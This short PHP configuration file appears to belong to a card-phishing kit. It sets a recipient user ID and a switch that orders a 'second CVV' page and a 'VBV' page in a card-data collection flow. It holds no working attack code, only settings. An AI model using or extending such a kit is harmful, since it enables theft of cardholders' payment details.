<?php
session_start();

$user_ids=array("1477335423");


$switch = 1; // if its equal to 1 then the 2nd cvv is first and if the value is 2 then the vbv is first


$error='1';
?>
